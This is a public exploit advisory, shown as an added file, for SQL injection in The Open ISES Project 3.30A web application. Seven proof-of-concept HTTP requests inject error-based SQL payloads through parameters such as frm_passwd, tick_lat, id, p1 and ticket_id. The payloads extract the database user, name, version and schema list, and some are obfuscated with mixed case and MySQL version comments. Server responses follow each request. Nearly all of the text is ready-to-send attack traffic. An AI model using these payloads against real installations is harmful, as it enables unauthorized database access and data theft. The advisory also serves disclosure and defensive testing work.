@@ -1,0 +1,184 @@
+# Exploit Title: The Open ISES Project 3.30A - 'tick_lat' SQL Injection
+# Dork: N/A
+# Date: 2018-10-18
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://openises.sourceforge.net/
+# Software Link: https://sourceforge.net/projects/openises/files/latest/download
+# Version: 3.30A_050318
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/main.php
+
+POST /[PATH]/main.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 241
+frm_passwd=') anD (SELect 155 FroM(SELECT COunt(*),COncaT(conCAT(0x203a20,UseR(),DatABASE(),VErSIoN()),0x7e,(seleCT (elT(155=155,1))),0x496873616e2053656e63616e,floOR(RAnd(0)*2))x frOM INFormATION_SchEMA.PLugINS GroUP BY x)a) And ('Efe'='Efe
+HTTP/1.1 200 OK
+Date: Thu, 18 Oct 2018 16:53:16 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Set-Cookie: PHPSESSID=pfdl1njr8uei6v7n3euoejuta7; path=/
+Set-Cookie: PHPSESSID=pfdl1njr8uei6v7n3euoejuta7; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 720
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/nearby.php?tick_lat=[SQL]&tick_lng=[SQL]
+
+GET /[PATH]/nearby.php?tick_lat=1)%20anD%20EXTRactVALUE(112,conCAT(CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),(SELect%20(ELT(112=112,1))),0x496873616e2053656e63616e))%20AND%20(66=66&tick_lng=1 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=pfdl1njr8uei6v7n3euoejuta7
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Thu, 18 Oct 2018 16:59:14 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 930
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 3)
+# http://localhost/[PATH]/ajax/form_post.php?id=[SQL]&ticket_id=[SQL]&q=1&function=editaction
+
+GET /[PATH]/ajax/form_post.php?id=1%27%20AnD%20EXTRactvaLUE(156,CONcat((selECT+GrouP_conCAT(scHEma_NAme+SEparaTOR+0x3c62723e)+frOM+INFOrmaTION_ScheMA.SCHEmatA),(SelecT%20(Elt(156=156,1))),0x496873616e2053656e63616e))--%20Efe&ticket_id=1&q=1&function=editaction HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=pfdl1njr8uei6v7n3euoejuta7
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Thu, 18 Oct 2018 17:10:13 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Set-Cookie: PHPSESSID=pfdl1njr8uei6v7n3euoejuta7; path=/
+Content-Length: 1321
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 4)
+# http://localhost/[PATH]/sever_graph.php?p1=[SQL]
+
+GET /[PATH]/sever_graph.php?p1=1%27%20AnD%20EXTRactvaLUE(156,CONcat((selECT+GrouP_conCAT(scHEma_NAme+SEparaTOR+0x3c62723e)+frOM+INFOrmaTION_ScheMA.SCHEmatA),(SelecT%20(Elt(156=156,1))),0x496873616e2053656e63616e))--%20Efe HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=pfdl1njr8uei6v7n3euoejuta7
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Thu, 18 Oct 2018 17:26:55 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 931
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 5)
+# http://localhost/[PATH]/inc_types_graph.php?p1=[SQL]
+  
+GET /[PATH]/inc_types_graph.php?p1=1%27%20AnD%20EXTRactvaLUE(156,CONcat((selECT+GrouP_conCAT(scHEma_NAme+SEparaTOR+0x3c62723e)+frOM+INFOrmaTION_ScheMA.SCHEmatA),(SelecT%20(Elt(156=156,1))),0x496873616e2053656e63616e))--%20Efe HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=pfdl1njr8uei6v7n3euoejuta7
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Thu, 18 Oct 2018 17:28:55 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 996
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 6)
+# http://localhost/[PATH]/city_graph.php?p1=[SQL]
+  
+GET /[PATH]/city_graph.php?p1=1%27%20AnD%20EXTRactvaLUE(156,CONcat((selECT+GrouP_conCAT(scHEma_NAme+SEparaTOR+0x3c62723e)+frOM+INFOrmaTION_ScheMA.SCHEmatA),(SelecT%20(Elt(156=156,1))),0x496873616e2053656e63616e))--%20Efe HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=pfdl1njr8uei6v7n3euoejuta7
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Thu, 18 Oct 2018 17:30:23 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 927
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 7)
+# http://localhost/[PATH]/add_facnote.php?ticket_id=[SQL]
+
+GET /[PATH]/add_facnote.php?ticket_id=1+/*!00005ProcEDUre*/+/*!00005AnaLYSe*/+(extractvalue(0,/*!00005cONcat*/(0x27,0x3a,@@VErsion)),0)--+- HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=pfdl1njr8uei6v7n3euoejuta7
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Thu, 18 Oct 2018 17:36:28 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Set-Cookie: PHPSESSID=pfdl1njr8uei6v7n3euoejuta7; path=/
+Content-Length: 1642
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
